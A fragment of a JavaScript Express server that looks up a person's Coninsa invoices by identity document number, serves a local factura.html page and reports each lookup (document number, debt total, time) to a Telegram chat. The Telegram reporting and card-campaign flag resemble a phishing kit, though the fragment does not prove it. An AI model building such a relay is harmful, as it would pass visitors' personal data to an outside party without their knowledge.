      isCardCampaignActive: data.isCardCampaignEnabled,
      invoices:             invoices.map(inv => ({
        id:          inv.id,
        descripcion: inv.description ?? inv.name ?? null,
        periodo:     inv.period ?? inv.periodStart ?? null,
        vencimiento: inv.dueDate ?? null,
        monto:       inv.amount ?? inv.totalAmount ?? 0,
        montoFmt:    fmtCOP(inv.amount ?? inv.totalAmount ?? 0),
        contrato:    inv.contractId ?? inv.contractNumber ?? null,
        direccion:   inv.serviceAddress ?? inv.address ?? null,
        estado:      inv.status ?? null,
        raw:         inv,
      })),
    };

    const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    await tgText(
      `🏢 <b>Coninsa — Consulta</b>\n\n` +
      `🔍 <b>Documento:</b> <code>${doc}</code>\n` +
      `📊 <b>Facturas:</b> ${invoices.length}\n` +
      (invoices.length > 0 ? `💰 <b>Total deuda:</b> ${fmtCOP(total)}\n` : `ℹ️ <b>Sin facturas pendientes</b>\n`) +
      `🕐 <b>Hora:</b> ${hora}`
    );

    cacheSet(cacheKey, result);
    return res.json(result);

  } catch (err) {
    console.error('[Coninsa] Error:', err.message);
    return res.status(502).json({ error: 'Error al consultar Coninsa. Intenta de nuevo.' });
  }
});

app.use(express.static(path.join(__dirname)));

app.listen(PORT, () =>
  console.log(`\n✅ Coninsa API v1.0 corriendo en http://localhost:${PORT}\n   Frontend: http://localhost:${PORT}/factura.html\n`)
);
